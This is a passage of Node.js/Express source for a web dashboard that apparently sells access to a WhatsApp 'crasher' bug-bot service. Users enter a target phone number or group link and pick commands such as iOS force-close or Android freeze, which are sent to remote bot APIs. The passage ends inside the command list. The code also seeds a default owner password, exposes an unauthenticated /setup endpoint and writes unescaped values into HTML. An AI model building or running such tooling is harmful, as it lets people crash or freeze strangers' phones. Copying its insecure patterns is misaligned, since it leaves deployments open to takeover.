const express = require("express");
const session = require("express-session");
const bodyParser = require("body-parser");
const fs = require("fs");
const path = require("path");
const bcrypt = require("bcryptjs");
const axios = require("axios");

const app = express();
const PORT = process.env.PORT || 3000;
const CONFIG_FILE = path.join(__dirname, "webConfig.json");
const USERS_FILE = path.join(__dirname, "webusers.json");
const DEFAULT_BG_VIDEO_URL = "https://files.catbox.moe/ebufuf.mp4";
const MAX_BOTS = 4;

let config = {
  bots: [
    { url: "", key: "", label: "Bot 1" },
    { url: "", key: "", label: "Bot 2" },
    { url: "", key: "", label: "Bot 3" },
    { url: "", key: "", label: "Bot 4" },
  ],
  backgroundVideoUrl: DEFAULT_BG_VIDEO_URL,
};
let currentSelection = { botIndex: 0, sessionId: null };

function normalizeBots(rawBots) {
  const out = [];
  for (let i = 0; i < MAX_BOTS; i++) {
    const b = (rawBots && rawBots[i]) || {};
    out.push({
      url: (b.url || "").replace(/\/$/, ""),
      key: b.key || "",
      label: b.label || "Bot " + (i + 1),
    });
  }
  return out;
}

function loadConfig() {
  if (fs.existsSync(CONFIG_FILE)) {
    try {
      const saved = JSON.parse(fs.readFileSync(CONFIG_FILE, "utf8"));
      if (Array.isArray(saved.bots)) config.bots = normalizeBots(saved.bots);
      if (saved.backgroundVideoUrl) config.backgroundVideoUrl = saved.backgroundVideoUrl;
      if (saved.currentSelection && typeof saved.currentSelection === "object") {
        currentSelection = {
          botIndex: saved.currentSelection.botIndex || 0,
          sessionId: saved.currentSelection.sessionId || null,
        };
      }
    } catch (e) {}
  }
  if (process.env.BOT_API_URL) config.bots[0].url = process.env.BOT_API_URL.replace(/\/$/, "");
  if (process.env.BOT_API_KEY) config.bots[0].key = process.env.BOT_API_KEY;
}

function saveConfig() {
  fs.writeFileSync(
    CONFIG_FILE,
    JSON.stringify({ bots: config.bots, backgroundVideoUrl: config.backgroundVideoUrl, currentSelection }, null, 2)
  );
}

loadConfig();

if (!fs.existsSync(USERS_FILE)) {
  const hash = bcrypt.hashSync("shah", 10);
  fs.writeFileSync(
    USERS_FILE,
    JSON.stringify([{ username: "shah", password: hash, role: "owner" }], null, 2)
  );
}

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(
  session({
    secret: process.env.SESSION_SECRET || "𝐋shah-secret-change-me",
    resave: false,
    saveUninitialized: false,
    cookie: { maxAge: 24 * 60 * 60 * 1000 },
  })
);

function requireLogin(req, res, next) {
  if (req.session.user) return next();
  res.redirect("/login");
}

function requireOwner(req, res, next) {
  if (req.session.user && req.session.user.role === "owner") return next();
  res.status(403).json({ success: false, message: "Access denied" });
}

function activeBots() {
  return config.bots.map((b, i) => ({ ...b, index: i })).filter((b) => b.url && b.key);
}

function getBot(index) {
  if (index === null || index === undefined) return null;
  const i = parseInt(index, 10);
  if (isNaN(i) || i < 0 || i >= config.bots.length) return null;
  const b = config.bots[i];
  if (!b || !b.url || !b.key) return null;
  return { ...b, index: i };
}

app.get("/setup", (req, res) => {
  const { url, key, slot } = req.query;
  if (!url || !key) return res.send("<h2>Missing URL or KEY</h2>");
  const idx = Math.max(0, Math.min(MAX_BOTS - 1, parseInt(slot || "0", 10) || 0));
  config.bots[idx].url = url.replace(/\/$/, "");
  config.bots[idx].key = key;
  saveConfig();
  res.send(
    `<html><body style="background:#0b0b0e;color:#fff;font-family:sans-serif;text-align:center;padding:60px 20px;"><h1 style="color:#ff2a4b;">Bot ${idx + 1} Configured</h1><p style="color:#888;">URL: <code>${config.bots[idx].url}</code></p><a href="/login" style="display:inline-block;margin-top:30px;padding:14px 30px;background:#ff2a4b;color:#fff;text-decoration:none;border-radius:8px;font-weight:bold;letter-spacing:2px;">GO TO LOGIN</a></body></html>`
  );
});

const CSS = `
@import url('https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;600;700&family=Share+Tech+Mono&display=swap');
:root{--bg:#050507;--panel-bg:rgba(17,17,22,.85);--neon-red:#ff2a4b;--neon-green:#00e676;--text-main:#fff;--text-muted:#888;--border-color:rgba(255,42,75,.25)}
*{margin:0;padding:0;box-sizing:border-box;font-family:'Rajdhani',sans-serif}
body{background:var(--bg);color:var(--text-main);min-height:100vh;overflow-x:hidden}
body::before{content:'';position:fixed;top:-50%;left:-50%;width:200%;height:200%;background:radial-gradient(circle at 20% 20%,rgba(255,0,60,.12),transparent 40%),radial-gradient(circle at 80% 80%,rgba(120,0,255,.1),transparent 40%);pointer-events:none;z-index:0}

/* ===== FULL SCREEN VIDEO BACKGROUND (LOGIN) ===== */
body.login-body{background:transparent;overflow:hidden}
.login-bg{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-2;overflow:hidden;background:#000}
.login-bg video{position:absolute;top:50%;left:50%;min-width:100%;min-height:100%;width:auto;height:auto;transform:translate(-50%,-50%);object-fit:cover}
.login-overlay{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;background:linear-gradient(135deg,rgba(5,5,7,.45) 0%,rgba(5,5,7,.35) 50%,rgba(5,5,7,.55) 100%);pointer-events:none}

.voltra-bg{min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;position:relative;overflow:hidden}
.voltra-container{width:100%;max-width:420px;text-align:center;position:relative;z-index:2}
.voltra-emblem{font-size:80px;margin-bottom:10px;filter:drop-shadow(0 0 30px rgba(255,42,75,.8));animation:pulse-glow 2s infinite alternate;display:inline-block}
@keyframes pulse-glow{from{filter:drop-shadow(0 0 15px rgba(255,42,75,.4))}to{filter:drop-shadow(0 0 40px rgba(255,42,75,1))}}
.voltra-title{color:var(--neon-red);font-size:32px;font-weight:900;letter-spacing:6px;margin-bottom:12px;text-transform:uppercase;text-shadow:0 0 20px rgba(255,42,75,.5)}
.voltra-tag{display:inline-block;background:rgba(255,42,75,.1);border:1px solid rgba(255,42,75,.3);color:var(--neon-red);font-size:10px;padding:8px 20px;border-radius:20px;letter-spacing:2px;margin-bottom:30px;font-weight:700;text-transform:uppercase}
.voltra-info-card{background:var(--panel-bg);backdrop-filter:blur(10px);border:1px solid var(--border-color);border-radius:20px;padding:30px 24px;margin-bottom:24px;box-shadow:0 15px 40px rgba(0,0,0,.8);position:relative;overflow:hidden}
.voltra-info-card::before{content:'';position:absolute;top:0;left:0;width:100%;height:4px;background:linear-gradient(90deg,transparent,var(--neon-red),transparent)}
.voltra-shield{font-size:32px;margin-bottom:12px;filter:drop-shadow(0 0 15px var(--neon-red))}
.voltra-info-card h3{color:#fff;font-size:14px;letter-spacing:4px;margin-bottom:12px;text-transform:uppercase;font-weight:800}
.voltra-info-card p{color:var(--text-muted);font-size:12px;line-height:1.8;margin-bottom:20px}
.voltra-form{display:flex;flex-direction:column;gap:14px;margin-bottom:16px}
.voltra-form input{width:100%;padding:16px;background:rgba(0,0,0,.6);border:1px solid #222;border-radius:12px;color:#fff;text-align:center;font-size:14px;transition:all .3s}
.voltra-form input::placeholder{color:#555;letter-spacing:1px}
.voltra-form input:focus{outline:none;border-color:var(--neon-red);box-shadow:0 0 20px rgba(255,42,75,.2);background:#0d0d12}
.voltra-btn-primary{width:100%;padding:18px;background:linear-gradient(135deg,var(--neon-red),#b3001b);border:none;border-radius:12px;color:#fff;font-size:14px;font-weight:800;letter-spacing:3px;cursor:pointer;text-transform:uppercase;box-shadow:0 10px 30px rgba(255,42,75,.4);transition:all .3s;display:flex;justify-content:center;align-items:center;gap:10px}
.voltra-btn-primary:hover{transform:translateY(-3px);box-shadow:0 15px 40px rgba(255,42,75,.6)}
.voltra-btn-outline{display:flex;justify-content:center;align-items:center;gap:10px;width:100%;padding:16px;background:transparent;border:1px solid rgba(255,42,75,.4);border-radius:12px;color:var(--neon-red);font-size:13px;font-weight:700;letter-spacing:2px;text-decoration:none;text-transform:uppercase;margin-bottom:12px;transition:all .3s}
.voltra-btn-outline:hover{background:rgba(255,42,75,.1);border-color:var(--neon-red);box-shadow:0 0 25px rgba(255,42,75,.2)}
.voltra-footer-text{color:#444;font-size:11px;letter-spacing:4px;margin-top:30px;margin-bottom:16px;font-weight:700;text-transform:uppercase}
.voltra-socials{display:flex;justify-content:center;gap:16px}
.voltra-social-icon{width:48px;height:48px;border-radius:50%;background:#0d0d12;border:1px solid #222;display:flex;align-items:center;justify-content:center;font-size:20px;text-decoration:none;transition:all .3s;color:#fff}
.voltra-social-icon:hover{border-color:var(--neon-red);box-shadow:0 0 20px rgba(255,42,75,.4);transform:translateY(-3px)}
.voltra-err{color:#ff3355;font-size:12px;margin-bottom:15px;font-weight:600;padding:10px;background:rgba(255,42,75,.1);border-radius:8px}

/* ===== FULL SCREEN VIDEO BACKGROUND (DASHBOARD) ===== */
.dashboard-bg{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-2;overflow:hidden;background:#000}
.dashboard-bg video{position:absolute;top:50%;left:50%;min-width:100%;min-height:100%;width:auto;height:auto;transform:translate(-50%,-50%);object-fit:cover}
.dashboard-overlay{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;background:linear-gradient(135deg,rgba(5,5,7,.55) 0%,rgba(5,5,7,.45) 50%,rgba(5,5,7,.65) 100%);pointer-events:none}
body.dashboard-body{background:transparent;padding-bottom:80px}

.app-header{display:flex;justify-content:space-between;align-items:center;padding:16px 20px;background:rgba(10,10,14,.9);backdrop-filter:blur(15px);border-bottom:1px solid var(--border-color);position:sticky;top:0;z-index:100}
.header-left{display:flex;align-items:center;gap:14px}
.header-left h1{color:var(--neon-red);font-size:16px;letter-spacing:3px;font-weight:800;text-shadow:0 0 10px rgba(255,42,75,.5)}
.menu-btn{background:transparent;border:none;color:#fff;font-size:22px;cursor:pointer;transition:all .2s}
.menu-btn:hover{color:var(--neon-red);text-shadow:0 0 10px var(--neon-red)}
.header-right{display:flex;align-items:center;gap:12px}
.user-badge{display:flex;align-items:center;gap:8px;background:rgba(255,42,75,.1);border:1px solid rgba(255,42,75,.3);padding:6px 14px;border-radius:20px;font-size:12px;font-weight:700;color:#fff}
.badge-owner{color:var(--neon-red);text-shadow:0 0 5px var(--neon-red)}
.badge-user{color:var(--neon-green);text-shadow:0 0 5px var(--neon-green)}
.app-container{max-width:480px;margin:0 auto;padding:20px;position:relative;z-index:1}
.welcome-card{background:var(--panel-bg);border:1px solid var(--border-color);border-radius:20px;padding:24px;margin-bottom:20px;position:relative;overflow:hidden;box-shadow:0 10px 30px rgba(0,0,0,.6)}
.welcome-card::before{content:'';position:absolute;top:0;left:0;width:100%;height:3px;background:linear-gradient(90deg,transparent,var(--neon-red),transparent)}
.welcome-top{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px}
.welcome-info h3{color:var(--text-muted);font-size:12px;letter-spacing:2px;text-transform:uppercase;margin-bottom:4px}
.welcome-info p{color:#fff;font-size:18px;font-weight:800;letter-spacing:1px}
.avatar-shield{width:50px;height:50px;background:linear-gradient(135deg,var(--neon-red),#b3001b);border-radius:14px;display:flex;justify-content:center;align-items:center;font-size:24px;box-shadow:0 0 20px rgba(255,42,75,.5)}
.stats-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:20px}
.stat-box{background:rgba(0,0,0,.4);border:1px solid #222;border-radius:14px;padding:16px 10px;text-align:center;transition:all .3s}
.stat-box:hover{border-color:var(--border-color);box-shadow:0 0 15px rgba(255,42,75,.1)}
.stat-icon{font-size:20px;margin-bottom:8px;filter:drop-shadow(0 0 8px var(--neon-red))}
.stat-val{color:#fff;font-size:16px;font-weight:800;font-family:'Share Tech Mono',monospace;margin-bottom:4px}
.stat-label{color:var(--text-muted);font-size:10px;letter-spacing:1px;text-transform:uppercase}
.section-title{display:flex;align-items:center;gap:10px;margin-bottom:16px;margin-top:24px}
.section-title h2{color:#fff;font-size:14px;letter-spacing:2px;font-weight:800;text-transform:uppercase}
.section-title::before{content:'';width:4px;height:18px;background:linear-gradient(180deg,var(--neon-red),#b3001b);border-radius:2px;box-shadow:0 0 10px var(--neon-red)}
.feature-card{background:var(--panel-bg);border:1px solid var(--border-color);border-radius:20px;padding:24px;margin-bottom:20px;position:relative;overflow:hidden}
.feature-card::after{content:'';position:absolute;bottom:-50px;right:-50px;width:150px;height:150px;background:radial-gradient(circle,rgba(255,42,75,.15),transparent 70%);pointer-events:none}
.field{margin-bottom:16px}
.field label{display:block;color:var(--text-muted);font-size:11px;letter-spacing:1.5px;margin-bottom:8px;text-transform:uppercase;font-weight:700}
.field input,.field select{width:100%;padding:14px 16px;background:rgba(0,0,0,.6);border:1px solid #222;border-radius:12px;color:#fff;font-size:14px;transition:all .3s;font-family:'Share Tech Mono',monospace}
.field input:focus,.field select:focus{outline:none;border-color:var(--neon-red);box-shadow:0 0 20px rgba(255,42,75,.2)}
.btn-exec{width:100%;padding:16px;background:linear-gradient(135deg,var(--neon-red),#b3001b);border:none;border-radius:12px;color:#fff;font-size:14px;font-weight:800;letter-spacing:3px;cursor:pointer;text-transform:uppercase;box-shadow:0 8px 25px rgba(255,42,75,.4);transition:all .3s;display:flex;justify-content:center;align-items:center;gap:10px}
.btn-exec:hover{transform:translateY(-2px);box-shadow:0 12px 35px rgba(255,42,75,.6)}
.btn-exec:disabled{background:#222;box-shadow:none;cursor:not-allowed;transform:none}
.result{margin-top:16px;padding:16px;background:rgba(0,0,0,.5);border-left:4px solid var(--neon-red);border-radius:8px;font-family:'Share Tech Mono',monospace;font-size:12px;color:var(--neon-green);white-space:pre-wrap;word-break:break-all;line-height:1.6;display:none}
.status-card{background:var(--panel-bg);border:1px solid var(--border-color);border-radius:20px;padding:20px;margin-bottom:20px}
.status-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px}
.status-badge{padding:6px 12px;border-radius:20px;font-size:10px;font-weight:700;letter-spacing:1px;background:rgba(255,42,75,.2);color:var(--neon-red);border:1px solid rgba(255,42,75,.4)}
.status-badge.online{background:rgba(0,230,118,.2);color:var(--neon-green);border-color:rgba(0,230,118,.4)}
.status-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:8px}
.status-item{text-align:center;padding:10px 5px;background:rgba(0,0,0,.3);border-radius:10px;border:1px solid #1a1a1a}
.status-item .val{font-size:14px;font-weight:800;font-family:'Share Tech Mono',monospace;color:#fff;margin-bottom:4px}
.status-item .lbl{font-size:9px;color:var(--text-muted);letter-spacing:1px;text-transform:uppercase}
.time-widget{background:var(--panel-bg);border:1px solid var(--border-color);border-radius:20px;padding:20px;margin-bottom:20px;display:flex;justify-content:space-between;align-items:center}
.time-left h3{color:var(--text-muted);font-size:11px;letter-spacing:2px;text-transform:uppercase;margin-bottom:4px}
.time-left .clock{color:#fff;font-size:32px;font-weight:800;font-family:'Share Tech Mono',monospace;text-shadow:0 0 15px rgba(255,42,75,.5)}
.time-right{text-align:right}
.time-right .date{color:var(--neon-red);font-size:12px;font-weight:700;letter-spacing:1px;margin-bottom:4px}
.time-right .day{color:var(--text-muted);font-size:11px;text-transform:uppercase}
.bottom-nav{position:fixed;bottom:0;left:0;width:100%;background:rgba(10,10,14,.95);backdrop-filter:blur(20px);border-top:1px solid var(--border-color);display:flex;justify-content:space-around;align-items:center;padding:10px 0 15px 0;z-index:1000}
.nav-item{display:flex;flex-direction:column;align-items:center;gap:4px;color:var(--text-muted);text-decoration:none;font-size:10px;font-weight:700;letter-spacing:1px;transition:all .3s;cursor:pointer;background:none;border:none;width:60px}
.nav-item.active{color:var(--neon-red);text-shadow:0 0 10px rgba(255,42,75,.5)}
.nav-item.active .nav-icon{filter:drop-shadow(0 0 10px var(--neon-red))}
.nav-icon{font-size:20px;margin-bottom:2px;transition:all .3s}
.nav-fab{width:56px;height:56px;background:linear-gradient(135deg,var(--neon-red),#b3001b);border-radius:50%;display:flex;justify-content:center;align-items:center;font-size:24px;color:#fff;box-shadow:0 0 20px rgba(255,42,75,.6);transform:translateY(-20px);border:4px solid var(--bg);cursor:pointer;transition:all .3s}
.nav-fab:hover{transform:translateY(-25px) scale(1.05);box-shadow:0 0 30px rgba(255,42,75,.8)}
.sidebar{position:fixed;top:0;left:-340px;width:320px;height:100vh;background:rgba(10,10,14,.98);backdrop-filter:blur(20px);border-right:1px solid var(--border-color);z-index:2000;transition:left .3s ease;overflow-y:auto;padding:24px 20px}
.sidebar.open{left:0}
.sidebar-overlay{position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:1999;opacity:0;pointer-events:none;transition:opacity .3s}
.sidebar-overlay.open{opacity:1;pointer-events:auto}
.sidebar h2{color:var(--neon-red);font-size:13px;letter-spacing:2px;margin-bottom:20px;display:flex;align-items:center;gap:8px;text-transform:uppercase}
.sidebar h2::before{content:'';width:3px;height:16px;background:linear-gradient(180deg,var(--neon-red),#b3001b);border-radius:2px;box-shadow:0 0 10px var(--neon-red)}
.close-btn{position:absolute;top:18px;right:18px;background:transparent;border:none;color:#666;font-size:24px;cursor:pointer;padding:4px 10px;border-radius:6px}
.close-btn:hover{color:var(--neon-red);background:rgba(255,42,75,.1)}
.current-session{background:rgba(0,230,118,.08);border:1px solid rgba(0,230,118,.3);border-radius:12px;padding:14px;margin-bottom:16px}
.current-session .label{color:var(--neon-green);font-size:10px;letter-spacing:1.5px;font-weight:700;text-transform:uppercase;margin-bottom:6px}
.current-session .value{color:#fff;font-family:'Share Tech Mono',monospace;font-size:12px;word-break:break-all}
.sessions-list{display:flex;flex-direction:column;gap:8px}
.session-item{padding:12px 14px;background:rgba(0,0,0,.3);border:1px solid #222;border-radius:10px;cursor:pointer;transition:all .2s;display:flex;align-items:center;justify-content:space-between;gap:8px}
.session-item:hover{border-color:var(--border-color);background:rgba(255,42,75,.05)}
.session-item.active{border-color:var(--neon-green);background:rgba(0,230,118,.1);box-shadow:0 0 0 2px rgba(0,230,118,.15)}
.session-item .id{font-family:'Share Tech Mono',monospace;font-size:11px;color:#ccc;word-break:break-all;flex:1}
.session-item .dot{width:8px;height:8px;border-radius:50%;flex-shrink:0}
.dot-on{background:var(--neon-green);box-shadow:0 0 8px var(--neon-green)}
.dot-off{background:#444}
.session-item .name{font-size:11px;color:#888;margin-top:3px}
.refresh-btn{width:100%;padding:10px;margin-top:16px;background:rgba(255,255,255,.05);border:1px solid #222;border-radius:8px;color:#fff;font-size:11px;font-weight:600;cursor:pointer;letter-spacing:1.5px;text-transform:uppercase}
.refresh-btn:hover{border-color:var(--neon-red)}
.admin-card{background:var(--panel-bg);border:1px solid var(--border-color);border-radius:20px;padding:24px;margin-bottom:20px}
.btn-green{width:100%;padding:16px;background:linear-gradient(135deg,var(--neon-green),#009624);border:none;border-radius:12px;color:#fff;font-size:14px;font-weight:800;letter-spacing:2px;cursor:pointer;text-transform:uppercase;box-shadow:0 8px 25px rgba(0,230,118,.4);transition:all .3s;margin-top:16px}
.btn-green:hover{transform:translateY(-2px);box-shadow:0 12px 35px rgba(0,230,118,.6)}
.loader{display:inline-block;width:14px;height:14px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .8s linear infinite;margin-right:8px;vertical-align:middle}
@keyframes spin{to{transform:rotate(360deg)}}
.view-section{display:none}
.view-section.active{display:block;animation:fadeIn .3s ease}
@keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
.theme-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:16px;margin-top:10px}
.theme-card{background:rgba(0,0,0,.4);border:1px solid #222;border-radius:16px;padding:20px;text-align:center;cursor:pointer;transition:all .3s}
.theme-card:hover{border-color:var(--border-color);background:rgba(255,255,255,.05)}
.theme-card.active{border-color:var(--neon-red);background:rgba(255,42,75,.1);box-shadow:0 0 15px rgba(255,42,75,.2)}
.theme-preview{width:40px;height:40px;border-radius:50%;margin:0 auto 12px;box-shadow:0 0 15px currentColor}
.theme-name{color:var(--text-main);font-size:13px;font-weight:700;letter-spacing:1px}
.config-status{display:flex;align-items:center;gap:8px;padding:10px 14px;border-radius:10px;font-size:11px;font-weight:700;letter-spacing:1px;margin-bottom:16px}
.config-status.ok{background:rgba(0,230,118,.1);border:1px solid rgba(0,230,118,.3);color:var(--neon-green)}
.config-status.bad{background:rgba(255,42,75,.1);border:1px solid rgba(255,42,75,.3);color:var(--neon-red)}
`;

function loginPage(err) {
  return `<!DOCTYPE html><html><head><title>𝐋𝐄𝐀𝐃𝐄𝐑 𝐒𝐇𝐀𝐇 𝐂𝐑𝐀𝐒𝐇𝐄𝐑</title><meta name="viewport" content="width=device-width,initial-scale=1"><style>${CSS}</style></head><body class="login-body">
<div class="login-bg"><video id="bgVid" autoplay muted loop playsinline><source src="${config.backgroundVideoUrl}" type="video/mp4"></video></div>
<div class="login-overlay"></div>
<div class="voltra-bg"><div class="voltra-container">
<div class="voltra-emblem">🕷️</div>
<h1 class="voltra-title">𝐋𝐄𝐀𝐃𝐄𝐑 𝐒𝐇𝐀𝐇 𝐂𝐑𝐀𝐒𝐇𝐄𝐑</h1>
<div class="voltra-tag">𝗙𝗔𝗦𝗧 • 𝗨𝗣𝗗𝗔𝗧𝗘 • 𝗦𝗧𝗔𝗕𝗟𝗘</div>
<div class="voltra-info-card">
<div class="voltra-shield">🛡️</div>
<h3>INFORMATION</h3>
<p>ᴩʀᴇᴍɪᴜᴍ ʙᴜɢ ʙᴏᴛ ᴇɴɢɪɴᴇ ᴇɴᴛᴇʀ yᴏᴜʀ ᴄʀᴇᴅᴇɴᴛɪᴀʟꜱ ᴛᴏ ᴀᴄᴄᴇꜱꜱ ᴛʜᴇ ꜱyꜱᴛᴇᴍ.</p>
${err ? '<div class="voltra-err">❌ Invalid username or password</div>' : ""}
<form method="POST" action="/login" class="voltra-form">
<input type="text" name="username" placeholder="Enter Username" required autofocus>
<input type="password" name="password" placeholder="Enter Password" required>
<button type="submit" class="voltra-btn-primary">🚀 𝗟𝗢𝗚𝗜𝗡 𝗧𝗢 𝗘𝗡𝗚𝗜𝗡𝗘</button>
</form>
</div>
<a href="https://t.me/SHAHLEADER12" target="_blank" class="voltra-btn-outline">🛒 𝗕𝗨𝗬 𝗔𝗖𝗖𝗘𝗦𝗦</a>
<a href="https://t.me/SHAHLEADER12" target="_blank" class="voltra-btn-outline">🎧 𝗖𝗢𝗡𝗧𝗔𝗖𝗧 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥</a>
<div class="voltra-footer-text">HUBUNGI KAMI</div>
<div class="voltra-socials">
<a href="https://t.me/SHAHLEADER12" target="_blank" class="voltra-social-icon">✈️</a>
<a href="https://t.me/SHAHLEADER12" target="_blank" class="voltra-social-icon">✈️</a>
<a href="https://wa.me/94789818858" target="_blank" class="voltra-social-icon">💬</a>
</div>
<div class="voltra-footer-text" style="margin-top:20px;font-size:10px;">OWNER @SHAHLEADER12 • @SHAHLEADER12</div>
</div></div>
<script>
(function(){
  var v = document.getElementById('bgVid');
  var unlocked = false;
  function unlockAudio(){
    if(unlocked) return;
    unlocked = true;
    v.muted = false;
    v.volume = 0.6;
    var p = v.play();
    if(p && p.catch) p.catch(function(){
      v.muted = true;
      v.play().catch(function(){});
    });
    document.removeEventListener('touchstart', unlockAudio);
    document.removeEventListener('click', unlockAudio);
    document.removeEventListener('keydown', unlockAudio);
  }
  document.addEventListener('touchstart', unlockAudio, {passive:true});
  document.addEventListener('click', unlockAudio);
  document.addEventListener('keydown', unlockAudio);
})();
</script>
</body></html>`;
}

app.get("/", (req, res) => res.redirect("/login"));
app.get("/login", (req, res) => res.send(loginPage(req.query.err)));

app.post("/login", (req, res) => {
  const { username, password } = req.body;
  const users = JSON.parse(fs.readFileSync(USERS_FILE, "utf8"));
  const user = users.find((u) => u.username === username);
  if (!user || !bcrypt.compareSync(password, user.password)) return res.redirect("/login?err=1");
  req.session.user = { username: user.username, role: user.role, telegramId: user.telegramId || null };
  res.redirect("/dashboard");
});

app.get("/logout", (req, res) => {
  req.session.destroy();
  res.redirect("/login");
});

app.get("/dashboard", requireLogin, (req, res) => {
  const isOwner = req.session.user.role === "owner";

  const botCardsHtml = config.bots
    .map((b, i) => {
      const configured = !!(b.url && b.key);
      const urlEsc = (b.url || "").replace(/"/g, "&quot;");
      const keyEsc = (b.key || "").replace(/"/g, "&quot;");
      const labelEsc = (b.label || "").replace(/"/g, "&quot;");
      return (
        '<div style="background:rgba(0,0,0,.3);border:1px solid #222;border-radius:12px;padding:16px;margin-bottom:14px;">' +
        '<div class="config-status ' + (configured ? "ok" : "bad") + '" id="cfgStatus' + i + '">' +
        (configured ? "✓ BOT " + (i + 1) + " CONFIGURED" : "✕ BOT " + (i + 1) + " NOT CONFIGURED") +
        "</div>" +
        '<div class="field"><label>Label</label><input type="text" id="cfgLabel' + i + '" value="' + labelEsc + '"></div>' +
        '<div class="field"><label>API URL</label><input type="text" id="cfgUrl' + i + '" placeholder="http://IP:3001" value="' + urlEsc + '"></div>' +
        '<div class="field"><label>API Key</label><input type="text" id="cfgKey' + i + '" placeholder="x-api-key" value="' + keyEsc + '"></div>' +
        '<div style="display:grid;grid-template-columns:2fr 1fr;gap:8px;">' +
        '<button class="btn-exec" onclick="saveApiConfig(' + i + ')">💾 SAVE BOT ' + (i + 1) + "</button>" +
        '<button class="btn-exec" style="background:linear-gradient(135deg,#444,#222);" onclick="clearApiConfig(' + i + ')">CLEAR</button>' +
        "</div>" +
        '<div id="cfgResult' + i + '" class="result"></div>' +
        "</div>"
      );
    })
    .join("");

  res.send(`<!DOCTYPE html><html><head><title>LEADERSHAH CRASHER</title><meta name="viewport" content="width=device-width,initial-scale=1"><style>${CSS}</style>
<script>
const savedTheme=localStorage.getItem('shah_theme')||'red';
const themeData={
red:{'--neon-red':'#ff2a4b','--bg':'#050507','--panel-bg':'rgba(17,17,22,.85)','--text-main':'#ffffff','--text-muted':'#888888','--border-color':'rgba(255,42,75,.25)'},
green:{'--neon-red':'#00e676','--bg':'#050807','--panel-bg':'rgba(15,22,18,.85)','--text-main':'#ffffff','--text-muted':'#6b8f7b','--border-color':'rgba(0,230,118,.25)'},
blue:{'--neon-red':'#00b0ff','--bg':'#050814','--panel-bg':'rgba(10,18,30,.85)','--text-main':'#ffffff','--text-muted':'#5c7a99','--border-color':'rgba(0,176,255,.25)'},
purple:{'--neon-red':'#d500f9','--bg':'#0a050f','--panel-bg':'rgba(20,10,25,.85)','--text-main':'#ffffff','--text-muted':'#8a5c99','--border-color':'rgba(213,0,249,.25)'}
};
if(themeData[savedTheme]){for(const[k,v]of Object.entries(themeData[savedTheme])){document.documentElement.style.setProperty(k,v)}}
</script>
</head><body class="dashboard-body">
<div class="dashboard-bg"><video id="dashVid" autoplay muted loop playsinline><source src="${config.backgroundVideoUrl}" type="video/mp4"></video></div>
<div class="dashboard-overlay"></div>
${isOwner ? `
<div class="sidebar-overlay" id="sidebarOverlay" onclick="closeSidebar()"></div>
<div class="sidebar" id="sidebar">
<button class="close-btn" onclick="closeSidebar()">×</button>
<h2>SESSIONS (ALL BOTS)</h2>
<div class="current-session"><div class="label">Active Session</div><div class="value" id="currentSessionValue">Loading...</div></div>
<button class="refresh-btn" style="background:linear-gradient(135deg,var(--neon-green),#009624);border:none;color:#fff;margin-bottom:10px;" onclick="selectAllSessions()">✅ SELECT ALL SESSIONS</button>
<div class="sessions-list" id="sessionsList"><div style="text-align:center;padding:20px;color:#555;font-size:12px;"><span class="loader"></span> Loading...</div></div>
<button class="refresh-btn" onclick="loadSessions()">REFRESH</button>
</div>` : ""}
<div class="app-header">
<div class="header-left">
${isOwner ? '<button class="menu-btn" onclick="openSidebar()">☰</button>' : ""}
<h1>𝐋𝐄𝐀𝐃𝐄𝐑 𝐒𝐇𝐀𝐇 𝐂𝐑𝐀𝐒𝐇𝐄𝐑</h1>
</div>
<div class="header-right">
<div class="user-badge">${req.session.user.username}<span class="${isOwner ? "badge-owner" : "badge-user"}">${isOwner ? "OWNER" : "USER"}</span></div>
<a href="/logout" style="color:var(--neon-red);text-decoration:none;font-size:18px;font-weight:bold;">⏻</a>
</div>
</div>
<div class="app-container">
<div id="view-home" class="view-section active">
<div class="welcome-card">
<div class="welcome-top">
<div class="welcome-info"><h3>Welcome Back,</h3><p>${req.session.user.username}</p></div>
<div class="avatar-shield">🛡️</div>
</div>
<div style="display:flex;justify-content:space-between;align-items:center;">
<span style="font-size:10px;background:rgba(255,42,75,.1);border:1px solid rgba(255,42,75,.3);padding:4px 10px;border-radius:10px;color:var(--neon-red);font-weight:700;letter-spacing:1px;">𝐋𝐄𝐀𝐃𝐄𝐑𝐒𝐇𝐀𝐇 𝗗𝗔𝗦𝗛𝗕𝗢𝗔𝗥𝗗</span>
<span style="font-size:10px;color:var(--text-muted);">2026-09-22</span>
</div>
</div>
<div class="stats-grid">
<div class="stat-box"><div class="stat-icon">👥</div><div class="stat-val" id="statOnline">0</div><div class="stat-label">Online</div></div>
<div class="stat-box"><div class="stat-icon">🔗</div><div class="stat-val" id="statConn">0</div><div class="stat-label">Connections</div></div>
<div class="stat-box"><div class="stat-icon">🤖</div><div class="stat-val" id="statBots">0</div><div class="stat-label">Bots Live</div></div>
</div>
<div class="time-widget">
<div class="time-left"><h3>Waktu Lokal</h3><div class="clock" id="clock">00:00:00</div></div>
<div class="time-right"><div class="date" id="date">--/--/----</div><div class="day" id="day">---</div></div>
</div>
<div class="section-title"><h2>Fitur Utama</h2></div>
<div class="feature-card">
<div class="field"><label>Target Number / Group Link</label><input type="text" id="target" placeholder="947xxxxxxxx OR https://chat.whatsapp.com/..." autocomplete="off"></div>
<div class="field"><label>Bug Command</label>
<select id="command">
<option value="CRASHIOS">𝗜𝗢𝗦 𝗙𝗢𝗥𝗖𝗘 𝗖𝗟𝗢𝗦𝗘</option>
<option value="freezeOne">𝗔𝗡𝗗𝗥𝗢𝗜𝗗 𝗙𝗥𝗘𝗘𝗭𝗘</option>
